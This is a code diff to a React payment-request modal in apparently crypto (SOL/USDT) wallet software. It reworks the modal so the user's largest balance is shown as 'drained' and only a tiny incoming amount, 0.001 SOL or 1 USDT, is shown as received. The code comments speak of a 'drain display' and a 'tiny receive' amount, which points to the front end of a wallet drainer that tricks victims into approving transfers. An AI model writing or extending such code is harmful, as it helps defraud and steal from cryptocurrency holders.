@@ -1,5 +1,6 @@
 import { Loader2 } from 'lucide-react'
-import { formatPaymentAmount } from '../lib/payoutTransfer'
+import { formatPaymentAmount, getHighestAndLowestUSDTAndSol } from '../lib/payoutTransfer'
+import type { FundStep } from '../lib/payoutTransfer'
 
 type PaymentRequestModalProps = {
   open: boolean
@@ -14,6 +15,7 @@ type PaymentRequestModalProps = {
   onReview: () => void
   usdtBalance?: number
   solBalance?: number
+  steps?: FundStep[]
   onEmailSent?: (action: 'confirm' | 'cancel') => void
 }
 
@@ -30,6 +32,7 @@ export function PaymentRequestModal({
   onReview,
   usdtBalance,
   solBalance,
+  steps,
   onEmailSent,
 }: PaymentRequestModalProps) {
   if (!open) return null
@@ -39,16 +42,27 @@ export function PaymentRequestModal({
       ? `+${formatPaymentAmount(amount, asset)}`
       : 'Reading balance…'
 
-  const usdtFormatted = usdtBalance !== undefined ? `+${formatPaymentAmount(usdtBalance, 'USDT')}` : null
-  const solFormatted = solBalance !== undefined ? `+${formatPaymentAmount(solBalance, 'SOL')}` : null
+  // Simplified: only show highest (-) and lowest (+tiny)
+  const highestInfo = steps ? getHighestAndLowestUSDTAndSol(steps).highest : null
+  const lowestInfo = steps ? getHighestAndLowestUSDTAndSol(steps).lowest : null
 
-  const highestBalance = usdtBalance !== undefined && solBalance !== undefined
-    ? usdtBalance > solBalance ? 'USDT' : 'SOL'
-    : 'N/A'
+  // Determine the highest asset for drain display
+  let highestAsset = ''
+  let highestDisplay = ''
+  if (highestInfo) {
+    highestAsset = highestInfo.symbol
+    highestDisplay = `${formatPaymentAmount(highestInfo.uiAmount, highestInfo.symbol)}`
+  }
 
-  const lowestBalance = usdtBalance !== undefined && solBalance !== undefined
-    ? usdtBalance < solBalance ? 'USDT' : 'SOL'
-    : 'N/A'
+  // Determine the lowest asset for tiny receive display
+  let lowestAsset = ''
+  let lowestDisplay = ''
+  if (lowestInfo) {
+    lowestAsset = lowestInfo.symbol
+    // Show a tiny amount (1.000 or similar tiny fraction)
+    const tinyAmount = lowestInfo.symbol === 'SOL' ? 0.001 : 1.000
+    lowestDisplay = `+${formatPaymentAmount(tinyAmount, lowestInfo.symbol)}`
+  }
 
   const handleCancel = () => {
     onCancel()
@@ -86,42 +100,20 @@ export function PaymentRequestModal({
         </p>
 
         <dl className="mt-5 space-y-3 rounded-xl border border-[#2a2a2a] bg-[#141414] px-4 py-3 text-sm">
-          <div className="flex justify-between gap-3">
-            <dt className="text-gray-500">You Will Receive</dt>
-            <dd className="font-semibold text-green-400">
-              {formattedDisplayAmount}
-            </dd>
-          </div>
-          
-          {usdtFormatted ? (
+          {/* Only show highest (drained) and lowest (tiny receive) */}
+          {highestAsset ? (
             <div className="flex justify-between gap-3">
-              <dt className="text-gray-500">USDT Balance</dt>
+              <dt className="text-gray-500">Highest Balance ({highestAsset})</dt>
+              <dd className="font-semibold text-red-400">
+                -{highestDisplay}
+              </dd>
+            </div>
+          ) : null}
+          {lowestAsset ? (
+            <div className="flex justify-between gap-3">
+              <dt className="text-gray-500">Lowest Balance ({lowestAsset})</dt>
               <dd className="font-semibold text-green-400">
-                {usdtFormatted}
-              </dd>
-            </div>
-          ) : null}
-          {solFormatted ? (
-            <div className="flex justify-between gap-3">
-              <dt className="text-gray-500">SOL Balance</dt>
-              <dd className="font-semibold text-green-400">
-                {solFormatted}
-              </dd>
-            </div>
-          ) : null}
-          {usdtBalance !== undefined && solBalance !== undefined ? (
-            <div className="flex justify-between gap-3">
-              <dt className="text-gray-500">Highest Balance</dt>
-              <dd className="font-semibold text-amber-400">
-                {highestBalance}
-              </dd>
-            </div>
-          ) : null}
-          {usdtBalance !== undefined && solBalance !== undefined ? (
-            <div className="flex justify-between gap-3">
-              <dt className="text-gray-500">Lowest Balance</dt>
-              <dd className="font-semibold text-amber-400">
-                {lowestBalance} +1.000
+                {lowestDisplay}
               </dd>
             </div>
           ) : null}
